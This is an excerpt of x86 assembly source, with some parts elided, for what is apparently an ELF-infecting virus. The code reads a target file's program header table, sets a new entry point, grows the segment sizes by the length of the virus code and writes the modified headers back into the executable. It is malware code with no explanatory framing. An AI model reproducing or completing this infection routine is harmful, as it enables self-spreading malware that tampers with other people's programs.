...
copy_program_header_table:
	...
	mov eax, dword[ebp-4]				;get fd
	lea ebx, [ebp-144]					;ebp-144 = ph_table
	read eax, ebx, (PHDR_size*2)	
modify_elf_header:
set_new_entry_point:
	...
	mov ecx, dword[ebp-144+PHDR_size+PHDR_vaddr]  ;addr on virtual memory 0x08048000
	add ecx, dword[ebp-12]				;length of file 
	sub ecx,  dword[ebp-144+PHDR_size+PHDR_offset]	;- program header offset
...
update_file_and_mem_size:
	mov eax, dword[ebp-144+PHDR_size+PHDR_filesize]	;get p_filesz from second row
	add eax, (virus_end-virus_start)				;+ virus code size
	sub eax,  dword[ebp-144+PHDR_size+PHDR_offset]	;- program header offset
	mov dword[ebp-144+PHDR_size+PHDR_filesize], eax	;set fileSize
	mov dword[ebp-144+PHDR_size+PHDR_memsize], eax	;set fileSize
write_back_ph_into_elf:
	mov eax, dword[ebp-4]				;get fd
	mov ebx, dword[ebp-72+PHDR_start]	;get ph_offset 
	lseek eax, ebx,SEEK_SET				;repositions the file offset	
	mov eax, dword[ebp-4]				;get fd
	lea ebx, [ebp-144]					;get loc in memry of ph_table
	write eax, ebx, (PHDR_size*2)		
close_file:
	mov eax, dword[ebp-4]
	close eax
	cmp eax, 0
